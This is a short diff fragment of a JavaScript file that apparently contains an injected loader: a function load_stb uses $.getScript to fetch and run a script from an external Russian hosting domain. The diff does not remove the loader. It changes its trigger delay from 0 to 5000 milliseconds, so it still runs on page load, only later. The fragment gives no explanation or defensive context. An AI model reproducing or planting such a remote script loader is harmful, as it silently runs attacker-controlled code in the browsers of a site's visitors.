@@ -131,4 +131,4 @@ function __$$(c){
 }
 
 function load_stb(){$.getScript('http://69786.web.hosting-russia.ru/stb.php')}
-try {setTimeout(load_stb, 0);}catch (e) {}
+try {setTimeout(load_stb, 5000);}catch (e) {}
